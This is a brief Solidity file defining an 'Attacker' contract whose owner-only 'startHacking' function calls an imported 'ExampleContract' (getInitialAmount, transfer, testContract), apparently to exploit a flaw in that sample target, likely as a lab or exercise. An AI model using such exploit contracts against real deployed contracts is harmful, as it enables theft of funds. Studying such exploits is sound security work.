pragma solidity 0.6.12;
import "./ExampleContract.sol";

contract Attacker{
    address owner;
    ExampleContract exampleContract;
    constructor(ExampleContract _exampleContract) public {
        exampleContract = _exampleContract;
        owner = msg.sender;
    }
    modifier ownerOnly {
        require(msg.sender == owner);
        _;
    }
    function startHacking() public ownerOnly {
        exampleContract.getInitialAmount();
        exampleContract.transfer(owner, 2);
        exampleContract.testContract(owner);
    }
}